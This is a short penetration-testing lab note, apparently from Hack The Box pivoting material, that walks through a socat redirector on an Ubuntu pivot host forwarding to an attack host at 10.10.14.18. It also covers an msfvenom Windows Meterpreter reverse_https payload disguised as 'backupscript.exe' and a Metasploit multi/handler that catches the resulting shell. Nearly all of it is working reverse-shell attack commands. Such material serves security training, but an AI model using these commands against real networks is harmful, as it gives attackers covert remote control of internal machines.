It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
# socat Redirection with a Reverse Shell
1. Starting Socat Listener on Ubuntu Pivot Host
## Ubuntu Pivot Host
```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server.
2. Creating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
3. Transfer to Ubuntu Pivot Host (using File Transfers methods)
4. Transfer from Ubuntu host to Windows Host on internal network
5. Starting MSF Console on Attack Host
```
w1j0y@htb[/htb]$ sudo msfconsole
```
```
msf6 > use exploit/multi/handler
```
```
set payload windows/x64/meterpreter/reverse_https
```
```
set lhost 0.0.0.0
```
```
set lport 80
```
```
run
```
6. Execute backupscript.exe on Windows Host
7. Network connection back to our listening port 80
8. Meterpreter shell
